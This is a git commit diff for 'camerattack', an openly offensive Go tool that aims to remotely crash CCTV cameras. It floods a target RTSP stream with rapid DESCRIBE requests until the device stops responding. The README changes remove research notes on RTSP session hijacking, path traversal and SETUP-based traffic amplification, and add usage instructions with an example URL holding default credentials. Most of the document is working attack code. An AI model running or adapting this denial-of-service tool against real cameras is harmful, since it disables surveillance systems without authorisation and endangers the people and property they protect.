b5000dc140bdc88f3f80c15736f3777c8c10e2df
Brendan LE GLAUNEC <brendan.leglaunec@etixgroup.com>
2017-10-31 17:33:22 +0100

    v1.0.0: Camerattack shuts down (at least some) cameras

--- README.md
+++ README.md
@@ -1,28 +1,13 @@
 # camerattack
-An attack tool designed to remotely shut down CCTV cameras
 
-## Current state of the repo
-I am currently researching ways to do that. The golang file you can see was just a quick test tool I made to try to spam the RTSP servers with requests, send them random data on purpose, etc. As of right now, I didn't find any security leak that could be exploited on all camera models. I want this tool to be able to remotely close any RTSP stream. Maybe session bruteforcing could be the only answer to that problem, but it would take a very long time and hopefully there are simpler ways.
+<p align="center"><img src="https://raw.githubusercontent.com/Ullaakut/camerattack/master/images/camerattack.gif" width="100%"/></p>
 
-## Solutions
+An attack tool designed to remotely shut down CCTV cameras.
 
-### Session hijacking + TEARDOWN request
+## Usage
 
-RTSP session identifiers are generated like such:
+Simply run it and provide it the RTSP stream URL as a parameter. Depending on your network speed and the camera you're trying to shutdown, it might work sooner or later, or might not work.
 
-> Session identifiers are opaque strings of arbitrary length. Linear white space must be URL-escaped. A session identifier MUST be chosen randomly and MUST be at least eight octets long to make guessing it more difficult. (See Section 16.)
-> `session-id   =   1*( ALPHA | DIGIT | safe )`
+## How does it work?
 
-**Example of generated session ID:**  `HtMdQMfjnH3DgnPr`
-
-### Requesting RTSP paths with `..` path component
-
-The RTSP RFC specifies that this needs to be handled by the RTSP server, but it's worth a try. The RFC also states that clients having a persistently suspicious behavior should be ignored in order not to let them guess the credentials of the camera, but as [cameradar](https://github.com/EtixLabs/cameradar/) proved it, it seems that none of the cameras nor RTSP servers implement this kind of security. This gives me the hope that there might be other security risks that were ignored by RTSP server implementers.
-
-### Concentrated denial of service attack
-
-Not related, but once a camera has been accessed with Cameradar, it can also be used to initiate traffic flows to one or more IP addresses by specifying them as the destination in SETUP requests. Once again, the RFC specifies that this can be stopped by not letting an IP initiate a connection to other clients, but I don't think that many RTSP servers would bother.
-
-## Conclusion
-
-From my little research, it seems that most RTSP servers are assumed to be inaccessible from the outside and thus their security is almost never considered. In many cases, simply connecting a machine in Ethernet in a building gives access to the camera's network, that can be probed easily using [cameradar](https://github.com/EtixLabs/cameradar/). Sometimes they're even accessible through WiFi, when the people who installed them really have no idea of what they're doing.
+It simply does lots of requests really quickly on the device, hoping that it will crash because of a memory leak or some mistakes in its firmware's code.
--- main.go
+++ main.go
@@ -3,159 +3,101 @@ package main
 import (
 	"fmt"
 	"os"
+	"strconv"
+	"strings"
+	"time"
 
 	curl "github.com/andelf/go-curl"
+
+	"github.com/fatih/color"
+	"github.com/gernest/wow"
+	"github.com/gernest/wow/spin"
 )
 
-func rtspOptions() {
-	fmt.Println("Beginning preparation of OPTIONS request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 1)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
-	}
+// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
+func doNotWrite([]uint8, interface{}) bool {
+	return true
 }
 
-func rtspDescribe() {
-	fmt.Println("Beginning preparation of DESCRIBE request...")
+func rtspDescribe(w *wow.Wow, target string, count int64) {
 	easy := curl.EasyInit()
 	defer easy.Cleanup()
 	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
+		// Do not send a body in the describe request
 		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
+		// Do not write sdp in stdout
+		easy.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
+		// Send a request to the URL of the stream we want to attack
+		easy.Setopt(curl.OPT_URL, target)
+		// Set the RTSP STREAM URI as the stream URL
+		easy.Setopt(curl.OPT_RTSP_STREAM_URI, target)
+		// 2 is CURL_RTSPREQ_DESCRIBE
 		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
-	}
-}
 
-func rtspAnnounce() {
-	fmt.Println("Beginning preparation of ANNOUNCE request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 3)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
-	}
-}
-
-func rtspSetup() string {
-	fmt.Println("Beginning preparation of SETUP request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSPHEADER, []string{"Transport: RTP/AVP;unicast;client_port=5067-5068\n"})
-		easy.Setopt(curl.OPT_HEADER, 1)
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 4)
-		fmt.Println("Performing request...")
 		err := easy.Perform()
-		fmt.Println("OK")
 		if err != nil {
-			fmt.Println(err)
+			if strings.Contains(err.Error(), "Couldn't connect to server") {
+				red := color.New(color.FgRed, color.Bold).SprintFunc()
+				clearOutput(w)
+				fmt.Printf("%s Can't access stream %s\n", red("\xE2\x9C\x94"), target)
+				os.Exit(1)
+			}
+
+			green := color.New(color.FgGreen, color.Bold).SprintFunc()
+			clearOutput(w)
+			fmt.Printf("%s After %d tries, the camera seems to have crashed.\n", green("\xE2\x9C\x94"), count)
 			os.Exit(0)
 		}
-		// fmt.Println(ret)
-		return "OK"
-	}
-	return "KO"
-}
-
-func rtspPlay(session string) {
-	fmt.Println("Beginning preparation of PLAY request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_RTSP_SESSION_ID, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 5)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
-	}
-}
-
-func rtspPause(session string) {
-	fmt.Println("Beginning preparation of PAUSE request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 6)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
-	}
-}
-
-func rtspTeardown(session string) {
-	fmt.Println("Beginning preparation of TEARDOWN request...")
-	easy := curl.EasyInit()
-	defer easy.Cleanup()
-	if easy != nil {
-		fmt.Println("Initialization of CURL OK")
-		easy.Setopt(curl.OPT_NOBODY, 1)
-		easy.Setopt(curl.OPT_URL, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_RTSP_STREAM_URI, "rtsp://localhost:8554/live.sdp")
-		easy.Setopt(curl.OPT_FOLLOWLOCATION, 0)
-		easy.Setopt(curl.OPT_RTSP_SESSION_ID, 0)
-		easy.Setopt(curl.OPT_HEADER, 0)
-		easy.Setopt(curl.OPT_VERBOSE, 1)
-		easy.Setopt(curl.OPT_RTSP_REQUEST, 7)
-		fmt.Println("Performing request...")
-		easy.Perform()
-		fmt.Println("OK")
 	}
 }
 
 func main() {
+	red := color.New(color.FgRed, color.Bold).SprintFunc()
 
-	for {
-		rtspOptions()
-		rtspDescribe()
-		session := rtspSetup()
-		fmt.Println(session)
+	err := curl.GlobalInit(curl.GLOBAL_ALL)
+	if err != nil {
+		fmt.Printf(
+			"%s curl initialization failed: %v\n",
+			red("\xE2\x9C\x96"),
+			err,
+		)
+		os.Exit(1)
 	}
+
+	args := os.Args[1:]
+	if len(args) == 0 {
+		fmt.Printf("usage: camerattack [RTSP URL]\n\texample: `./camerattack rtsp://admin:12345@192.168.1.1:554/live.sdp`\n")
+		os.Exit(1)
+	}
+	w := startSpinner()
+	for count := int64(0); count < 2000; count++ {
+		updateSpinner(w, "[Attempt #"+strconv.FormatInt(count, 10)+"] Attacking RTSP stream...")
+		rtspDescribe(w, args[0], count)
+	}
+	clearOutput(w)
+	fmt.Printf("%s %s\n%s\n%s%s",
+		red("\xE2\x9C\x96"),
+		"Could not crash camera after 100000 attempts.",
+		"You can try to run the program again but it's unlikely that this camera can be remotely shut down.",
+		"The reason can be that the network speed and stability between you and the camera is not good enough",
+		"to send requests to the camera quick enough.",
+	)
+}
+
+func updateSpinner(w *wow.Wow, text string) {
+	w.Text(" " + text)
+}
+
+func startSpinner() *wow.Wow {
+	w := wow.New(os.Stdout, spin.Get(spin.Dots), " Starting up...")
+	w.Start()
+	return w
+}
+
+// HACK: Waiting for a fix to issue
+// https://github.com/gernest/wow/issues/5
+func clearOutput(w *wow.Wow) {
+	w.Text("\b")
+	time.Sleep(80 * time.Millisecond)
+	w.Stop()
 }
